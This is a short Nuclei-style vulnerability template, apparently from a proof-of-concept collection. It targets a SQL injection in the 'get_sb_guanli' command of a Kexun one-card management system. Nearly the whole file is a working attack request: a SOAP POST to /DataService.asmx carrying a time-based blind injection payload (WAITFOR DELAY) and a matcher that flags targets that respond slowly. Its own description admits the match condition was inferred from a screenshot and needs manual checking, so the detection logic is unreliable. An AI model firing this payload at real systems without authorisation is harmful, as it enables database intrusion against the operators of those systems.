id: poc-qhveop5hvw7fwfdq
info:
  name: 科讯一卡通管理系统get_sb_guanli存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2024
http:
- raw:
  - "POST /DataService.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/ExeAppCmd\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <ExeAppCmd xmlns=\"http://tempuri.org/\">\n      <str>{\"cmd\":\"get_sb_guanli\",\"Type\":\"1');WAITFOR DELAY '0:0:5'--\"}</str>\n      <files>MTIz</files>\n    </ExeAppCmd>\n  </soap:Body>\n</soap:Envelope>"
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
